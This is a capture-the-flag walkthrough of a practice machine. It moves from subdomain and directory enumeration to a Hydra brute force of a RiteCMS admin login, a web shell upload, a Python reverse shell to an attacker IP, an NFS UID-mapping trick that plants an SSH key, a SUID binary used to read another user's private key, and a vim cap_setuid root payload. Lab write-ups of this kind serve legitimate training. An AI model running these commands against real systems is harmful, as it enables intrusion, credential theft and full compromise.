# Undiscovered

## Nmap

```
sudo nmap 10.10.144.20 -p- -sS -sV   

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
35619/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add undiscovered.thm to /etc/hosts.
{% endhint %}

Browsing port 80 takes us to the following page below.

![](<../../../.gitbook/assets/image (1368).png>)

From here I checked directories with dirsearch.py and was unable to discover anything of interest.

![](<../../../.gitbook/assets/image (1369).png>)

Checking NFS also proved futile as I was unable to show any mounts. From here we can check for sub domains with wfuzz.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://undiscovered.thm" -H "Host: FUZZ.undiscovered.thm" -t 42 --hl 9  
```

![](<../../../.gitbook/assets/image (1370).png>)

As we have results for multiple sub domains we should look for the key difference which is the lines returned where deliver and booking are of interest. Add both of these to the /etc/hosts file.

```
<IP> booking.undiscovered.thm
<IP> deliver.undiscovered.thm
```

Viewing booking.undiscovered.thm in the browser:

![http://booking.undiscovered.thm/](<../../../.gitbook/assets/image (1371).png>)

And deliver.undiscovered.thm:

![http://deliver.undiscovered.thm/](<../../../.gitbook/assets/image (1372).png>)

From here I ran enumeration with dirsearh.py against both sub domains and was unable to get anything from booking.undiscovered.thm. I was however able t get results on deliver.undiscovered.thm.

```
python3 dirsearch.py -u deliver.undiscovered.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 75 --full-url 
```

![](<../../../.gitbook/assets/image (1373).png>)

Over on /cms I tried logging in with the CMS default credentials of `admin:admin`.

![](<../../../.gitbook/assets/image (1374).png>)

I was however unsuccessful. I then caught the request with Firefox and used this to build a bruteforce attempt with Hydra.

![](<../../../.gitbook/assets/image (1375).png>)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  deliver.undiscovered.thm  http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" 
```

After a short while we get a valid response in Hydra.

![](<../../../.gitbook/assets/image (1376).png>)

Using searchsploit we can see RiteCMS 2.2.1 has a couple of authenticated RCE exploits.

![](<../../../.gitbook/assets/image (1377).png>)

{% embed url="https://www.exploit-db.com/exploits/48636" %}

![](<../../../.gitbook/assets/image (1378) (1).png>)

As per the listed steps head to Adminsitration > File Manager and upload a web shell.

![](<../../../.gitbook/assets/image (1381).png>)

Once uploaded you will be given a direct link to the file. As per below we now have RCE.

![](<../../../.gitbook/assets/image (1380).png>)

I then set a `netcat` listener on my attacking machine and then run the following command in the webshell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.3.108",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Where we retrieve a proper reverse shell.

![](<../../../.gitbook/assets/image (1382).png>)

From I then transferred over linpeas. After we find the following below.

![](<../../../.gitbook/assets/image (1383).png>)

We can mount the `/home/william` directory on our attacking machine. On the attacking machine run the commands below:

```
mkdir /mountpoint
sudo mount -t nfs undiscovered.thm:/home/william /mountpoint
```

When attempting to `cd` into `/mountpoint` we are given a access denied error. Viewing the permissions of `/mountpoint` shows that the owner and group owner are set as `nobody:4294967294`

![](<../../../.gitbook/assets/image (1384).png>)

This problem exists because of UID mapping. We need to ensure the user intended to access `/home/william` exists on the attacking machine with the same UID as on the target machine.

Checking /etc/passwd on the attacking machine we see william has a UID and GUID of 3003.

![](<../../../.gitbook/assets/image (1386) (1).png>)

From here we can set up a user called william on our attacking machine with the same UID and GUID and then attempt to access the share again.

Creating a new user on the attacking machine:

```
sudo adduser william --home /home/william --shell /bin/bash --uid 3003
```

![](<../../../.gitbook/assets/image (1387).png>)

We can `su` to william with the password defined in the last step and the `cd` into `/mountpoint`.

![](<../../../.gitbook/assets/image (1388).png>)

As we have effective access as the user william into his home directory we can set it up so we can SSH in as the user william.

On the attacking machine do:

```
ssh-keygen -t rsa
```

Complete the process without providing a password. Then create the `.ssh` directory in `/mountpoint` then echo the contents of the attacking machine `/home/kali/.ssh/id_rsa.pub` into `/mountpoint/.ssh/authorized_keys`.

On the attacking machine as the user william

```
mkdir /mountpoint/.ssh
```

Then echo the contents of `/home/kali/.ssh/id_rsa.pub`into `/mountpoint/.ssh/authorized_keys`

```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnkejs7hzvX7ZyEMNckFFyhIWW4DvIHmQGlgqjkbIOjy4Z78VdAWDS27A/Z452X0di9h2TKuBUZKFh8x1z9hHV6XW6vtVtP4hhdesBDs9jG69weJwBwbJcQBLU9jJp/1Wjf6cn00LBSW1CcAakvE6mNgkUfe2puhlQMeo4EbtRp9qkIMDwIufeazi0+xFQSZkGs7KtaJr5XH24lw8Cf3P7deo9bgbvyhVqTomnZ39/9/yWS1/WiPxiMNJlHHLdGRzkyKWFpANbcmWGF9EGc+2jx3GKCmi5GeIdQVJM6Yj5Sy1bkmg6S6YvZWZ2JJg/Z7pa9Bl9/vvruypdQwuT34WqRskr7UYeERB9TFrC/gDgVQsqWjXs9OJInx4bGIbbXwTE0gZqRP3NaRUqD1Iair2gHlwrvxLERNJ7bt3jHOXdkto6DOz9HDyJzrrd82nCdwUIqPR5p2efPN0D33Ko/gQy486DwnWwBq+PHMhbEOHS99auL6xHFs/ja0xo2qOT4Hk= kali@kali' > authorized_keys
```

After doing so we can connect to SSH as the user william without providing a password.

```
ssh william@undiscovered.thm
```

After connecting and checking the directory again we see that script has a SUID bit set for the user leonard.

![](<../../../.gitbook/assets/image (1389).png>)

Running the binary with the parameter 'test' shows an attempt to use `/bin/cat` to read from `/home/leonard/test`.

![](<../../../.gitbook/assets/image (1390).png>)

We can try with the parameter `.ssh/id_rsa` to see if we can read a SSH private key.

![](<../../../.gitbook/assets/image (1391).png>)

We can then copy the key to our attacking machine and use the following command to set the correct permission on it.

```
 chmod 600 id_rsa
```

We can then SSH in as leonard ensuring the id\_rsa key is specified.

![](<../../../.gitbook/assets/image (1392).png>)

Now that we are leonard and running linpeas shows that vim.basic has cap\_setuid+ep set.

![](<../../../.gitbook/assets/image (1393).png>)

Checking GTFOBins for vim capabilities.

![](<../../../.gitbook/assets/image (1394).png>)

We see we need to edit the command a little bit here.

```
 /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Once connected in we need to escape from vim using `:!/bin/sh`

![](<../../../.gitbook/assets/image (1395).png>)

We are now root.
